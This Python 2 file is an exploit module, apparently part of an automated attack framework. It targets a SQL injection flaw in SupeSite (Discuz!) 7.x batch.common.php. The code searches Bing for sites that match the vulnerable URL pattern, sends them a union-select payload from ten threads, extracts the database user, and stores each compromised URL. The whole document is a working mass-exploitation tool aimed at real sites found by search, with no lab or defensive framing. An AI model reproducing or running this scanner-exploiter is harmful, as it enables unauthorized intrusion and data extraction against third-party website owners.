#!/usr/bin/env python
# -*- coding: utf-8 -*-

from auto_exp.lib.core.exploit.base_class import AEFbase
import re
import requests
import threading
import Queue


class Worker(threading.Thread, AEFbase):

    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        while True:
            url_fix = "?action=modelquote&cid=113&name=spacecomments"
            exp = "?action=modelquote&cid=113&name=spacecomments where 1=2 union select 1,2,3,4,5,concat(0x7e,user(),0x7e),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 %23"
            if self.queue.empty():
                break
            try:
                key = self.queue.get_nowait()
                url = key + exp
                a = re.findall(
                    r'~(.*?)~', requests.get(url, timeout=2).content)
                if len(a) > 0:
                    self.print_info(
                        "URL:" + key + url_fix + " INFO:" + a[0])
                    self.db.add_url(key + url_fix, self.info['Name'], a[0])
                else:
                    self.print_error("URL:" + key + url_fix +
                                     " INFO: Error Exploit")
            except:
                pass


class AEF(AEFbase):

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            "Type": self.type.injection,
            "Level": self.level.high,
            "Author": "HackBoy",
            "Desc": "SupeSite(Discuz!) 7.x SQL injection",
            "Name": "supesite_7x_sql",
            "Version": "1.0",
            "Keyword": "batch.common.php?action=",
            "Search_Method": "Bing",
        }

    def run(self):
        res = self.search.run_bing(self.info['Keyword'], 10)
        queue = Queue.Queue()
        for key in res:
            try:
                key = key[:key.find('?')]
                queue.put(key)
            except Exception, e:
                print e
                pass
        try:
            threads = []
            for i in range(10):
                threads.append(Worker(queue))
            for t in threads:
                t.start()
            for t in threads:
                t.join()
        except Exception, e:
            print e
            pass

    def __check(self, url):
        try:
            res = requests.get(url, timeout=2)
            if res.status_code == requests.codes.ok:
                return True
            else:
                return False
        except:
            return False
if __name__ == "__main__":
    pass
